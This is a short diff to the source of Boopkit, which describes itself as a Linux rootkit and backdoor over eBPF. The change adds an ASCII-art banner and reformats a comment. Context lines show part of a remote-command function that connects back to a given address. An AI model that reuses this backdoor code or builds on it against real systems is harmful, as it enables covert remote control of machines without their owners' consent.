@@ -38,6 +38,18 @@
 #include "pr0be.skel.h"
 // clang-format on
 
+// asciiheader is the main runtime banner.
+void asciiheader() {
+  printf("\n\n");
+  printf("   ██████╗  ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗████████╗\n");
+  printf("   ██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║╚══██╔══╝\n");
+  printf("   ██████╔╝██║   ██║██║   ██║██████╔╝█████╔╝ ██║   ██║   \n");
+  printf("   ██╔══██╗██║   ██║██║   ██║██╔═══╝ ██╔═██╗ ██║   ██║   \n");
+  printf("   ██████╔╝╚██████╔╝╚██████╔╝██║     ██║  ██╗██║   ██║   \n");
+  printf("   ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝   ╚═╝   \n");
+  printf("\n\n");
+}
+
 void usage() {
   printf("Boopkit version: %s\n", VERSION);
   printf("Linux rootkit and backdoor over eBPF.\n");
@@ -67,7 +79,7 @@ int recvrce(char dial[INET_ADDRSTRLEN], char *rce) {
     return 1;
   }
   if (connect(revsock, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
-    //printf(" XX Connection SOCK_STREAM refused.\n");
+    // printf(" XX Connection SOCK_STREAM refused.\n");
     return 1;
   }
 
